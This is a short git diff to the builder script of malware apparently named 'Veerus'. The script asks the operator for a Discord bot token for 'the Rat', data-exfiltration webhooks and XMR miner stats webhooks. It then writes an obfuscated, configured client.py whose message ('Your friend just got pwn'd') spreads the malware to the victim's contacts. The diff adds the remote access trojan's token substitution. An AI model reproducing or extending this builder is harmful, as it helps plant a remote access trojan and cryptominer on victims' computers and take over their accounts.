@@ -5,6 +5,9 @@ import os
 import pyImpossibleObf
 
 key ="loooood"
+discordbottoken = input("Discord Bot Token (For The Rat) : ")
+if discordbottoken == "":
+	discordbottoken = input("Discord Bot Token (For The Rat) Re-Enter: ")
 webhook = input("Webhook : ")
 webhookstats = input("XMR Miner Stats : Webhook : ")
 if(webhookstats == ""):
@@ -62,7 +65,7 @@ Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me expl
 
 	Links :
 		Discord : https://discord.gg/7GkfBzRQXX
-		Github : https://github.com/0xSxZ/Veerus""", dmallmsg)
+		Github : https://github.com/0xSxZ/Veerus""", dmallmsg).replace("BotTokenForTheRat667", discordbottoken)
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
